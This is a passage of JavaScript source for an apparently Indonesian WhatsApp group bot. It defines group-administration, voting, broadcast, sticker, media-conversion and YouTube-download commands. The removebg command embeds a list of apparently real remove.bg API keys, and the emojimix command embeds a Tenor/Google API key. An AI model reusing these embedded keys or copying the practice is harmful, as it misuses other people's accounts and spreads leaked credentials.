		await chika.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await chika.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await chika.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await chika.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await chika.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await chika.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                await chika.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                await chika.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                chika.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            chika.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: chika.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            chika.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: chika.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            chika.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: chika.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            chika.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${chika.user.id}
`
chika.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await chika.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await chika.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `Mode Group`, chika.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await chika.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await chika.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `Mode Edit Info`, chika.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `Mode Antilink`, chika.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${chika.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${chika.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `Mute Bot`, chika.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                let response = await chika.groupInviteCode(m.chat)
                chika.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await chika.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await chika.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                chika.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} Riy ganteng`
                let getGroups = await chika.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: `${sc}`
                                }
                            }, {
                                urlButton: {
                                    displayText: 'Website',
                                    url: `${myweb}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Donasi',
                                    id: 'donasi'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Menu',
                                    id: 'menu'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      chika.send5ButImg(i, txt, chika.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: `${sc}`
                                }
                            }, {
                                urlButton: {
                                    displayText: 'Website',
                                    url: `${myweb}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Donasi',
                                    id: 'donasi'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Menu',
                                    id: 'menu'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      chika.send5ButImg(yoi, txt, chika.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                chika.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await chika.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 chika.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await chika.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 chika.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    chika.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await chika.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await chika.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
case 'smeme': case 'stickermeme': case 'stickmeme': {
let { TelegraPh } = require('./lib/uploader')
if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
m.reply(mess.wait)
mee = await chika.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await chika.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
            case 'ebinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            m.reply(db)
        }
        break
            case 'emojimix': {
	        if (!text) throw `Example : ${prefix + command} 😅+🤔`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await chika.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    chika.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await chika.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            chika.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            chika.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${chika.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            chika.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await chika.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		        let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await chika.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    chika.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                chika.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: chika.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: chika.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                chika.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                chika.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
